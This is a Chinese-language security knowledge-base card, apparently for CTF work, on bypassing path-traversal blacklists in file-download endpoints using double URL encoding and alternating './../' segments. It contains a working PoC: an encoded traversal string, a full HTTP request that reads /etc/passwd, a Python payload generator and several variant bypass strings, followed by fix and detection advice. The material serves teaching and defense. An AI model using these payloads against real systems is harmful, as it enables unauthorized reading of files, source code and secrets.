---
id: web-generic-file-inclusion-double-encoded-alternating-dotdot-traversal
title: 双重 URL 编码 + ./../ 交替：绕过连续目录穿越黑名单读取任意文件
type: scenario
domain: web
path: web/generic/file-inclusion
technique: double-encoded-alternating-dotdot-traversal-bypass
tags:
- path-traversal
- arbitrary-file-read
- double-url-encoding
- filter-bypass
- dotdot
- web
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V206
  verified_at: '2026-11-07T02:23:49+08:00'
  notes: 已对照原文与图20-23核对：/admin/download 对 ../../etc/passwd 返回 404/400，改用 %252E%252F 双重编码 + ./../ 交替并增加层数后读取 /etc/passwd、app.py、flag.txt 均 200；卡内双重解码/连续 ../ 黑名单绕过机制与 PoC 一致。未复跑 PoC；原文未给出过滤源码，机制为按状态码变化推断。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-double-encoded-alternating-dotdot-traversal/
draft: false
kb_aliases:
- 双重 URL 编码目录穿越
- ./../ 交替绕过
- '%252E%252F 穿越'
- 连续 ../ 黑名单绕过
- download 任意文件读取
- 二次解码路径穿越
---

## 一句话结论

下载/文件读取接口若先对“解码一次后的路径”做黑名单（拦截连续 `../` 或目录穿越段），随后又由框架/代码再解码一次并拼到文件系统路径，攻击者可提交双重编码的 `%252E%252F`（第一次解码为 `%2E%2F`，第二次才成为 `./`），并把穿越段写成 `./.././../` 交替形式避免命中“连续 `../`”规则，配合足够的层数即可读取 `/etc/passwd`、源码与 flag。

## 原理

- **两次解码**：请求进入应用时，容器/框架通常已对 URL 解码一次；业务代码若又调用 `unquote`/`decodeURIComponent`/二次 URL 解码，则 `%252E` → `%2E` → `.`。黑名单如果插在两次解码之间，看到的是 `%2E%2F`（不含 `.`/`/` 字面量），不会拦截。
- **连续穿越黑名单**：常见过滤用正则/字符串检查 `../` 连续出现（如 `(\.\./){2,}`、`../../`、`..%2f..%2f`）。把路径写成 `./.././.././../` 时，每两个 `../` 之间被 `./` 隔开，字符串中不再出现“连续两个 `../`”的子串，但文件系统逐段解析后等价于多层上跳。
- **深度**：Web 应用的工作目录/上传目录通常有多层（如 `/app/static/uploads/`），需要足够多的 `../` 才能到达 `/`；文中最终使用了约 20 组 `./../`。判断层数可通过读取已知文件（`/etc/passwd`）试错，或从报错/源码推断。
- **为什么可行**：过滤发生在字符串层，路径解析发生在文件系统层，两者对同一字符串的理解不同；URL 解码次数与顺序是常见的错位点。
- **边界**：若框架在路由匹配前已做完整解码/规范化，或使用 `path.Clean`/`filepath.Clean` 后再做前缀校验，双重编码会被还原成 `../` 并被拦截；若下载接口使用 ID/白名单映射而非用户路径，则不存在该问题。

## 触发条件

- 存在按用户输入路径读取/下载文件的接口（如 `/admin/download/<path>`、`?file=`）。
- 过滤在解码一次后的字符串上做，且只拦连续 `../`/`..` 字面量；后续还有一次解码或框架再次解码。
- 过滤与文件系统使用之间存在解码/规范化差异。
- 攻击者有权限访问该接口（可能需要登录/后台会话）。
- 目标文件对应用进程可读。

## 利用步骤

1. 确认接口与参数：抓取下载请求，观察路径是否直接拼进响应/文件读取。
2. 基线测试：`../../etc/passwd` 与 `../../../etc/passwd`，对比 404/400/302/200，判断过滤触发点与目录深度。
3. 编码测试：把 `../` 改为 `%2e%2e%2f`（单次编码）和 `%252E%252E%252F`（双重编码），观察状态码变化；若双重编码后从 400 变 302/200，说明存在二次解码且绕过了过滤。
4. 交替构造：用 `./../` 反复拼接（如 `./.././.././../`）避免连续 `../`；再对整段做两次 URL 编码（`%252E%252F%252E%252E%252F...`）。
5. 增加层数直到读取 `/etc/passwd`；随后按同样方式读取应用源码（`app.py`/`index.php`/`web.config`）定位 flag 路径与更多配置。
6. 读取目标文件；记录 payload 与响应，清理测试文件。

## PoC

```text
# 交替 ./../ 再双重 URL 编码（示意，层数按目标调整）
原始:  ./.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd
双重编码:
%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F
%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F
%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F
%252E%252F%252E%252E%252Fetc%252Fpasswd
```

```http
GET /admin/download/%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252Fetc%252Fpasswd HTTP/1.1
Host: target
Cookie: session=<有效会话>
```

```python
from urllib.parse import quote

def payload(path="/etc/passwd", hops=20):
    raw = "".join("./../" for _ in range(hops)) + path.lstrip("/")
    once = quote(raw, safe="").replace(".", "%2E")   # . -> %2E, / -> %2F
    twice = quote(once, safe="")                     # % -> %25，得到 %252E%252F
    return twice

print(payload("/etc/passwd", 20))
print(payload("/app/app.py", 20))
```

```text
提示：若服务端只做一次解码，单次编码（%2e%2e%2f）即可；双重编码针对“过滤后再解码一次”的实现。
状态码从 400 变 302/200 是过滤被绕过的信号，不代表文件已读到；需继续调整层数/路径。
```

## 变体与关联

- 变体：混合编码（`%2e%2e/`、`..%2f`、`%2e%2e%5c` 针对 Windows）、大小写、Unicode 点、分号路径参数（`;`）绕过不同解析器。
- 变体：过滤只拦 `../` 时用 `....//`、`..;/`、`..././`、`.%2e/` 等变形；本质都是让字符串层与文件系统层理解不同。
- 变体：双重编码用于查询参数/路径段/文件名，取决于框架解码阶段；需先用探测确认解码次数。
- 关联：[[web-generic-file-inclusion-encoded-dotdot-predecode-blacklist-bypass]]（单次编码 + 预解码黑名单）、[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（`new File(root,path)` 缺少规范路径校验）、[[web-generic-file-inclusion-flask-sendfile-download-traversal]]（下载接口穿越）。

## 检测与防御

- 修复：在解码/规范化之后再做校验，使用 `os.path.realpath`/`Path.resolve()` 得到绝对路径，并校验其必须位于允许的根目录内；不要用字符串黑名单。
- 修复：下载接口使用文件 ID/白名单映射，禁止用户直接传路径；对文件名做严格白名单（仅字母数字、点、下划线）。
- 加固：Web 容器/框架统一解码规则，避免业务层二次解码；拒绝包含 NUL、反斜杠、编码点的路径。
- 检测：请求路径出现 `%252E`、多重 `../`、`./../` 交替、异常深层目录；下载响应返回应用目录之外的文件；同一会话对 download 接口高频尝试不同路径。
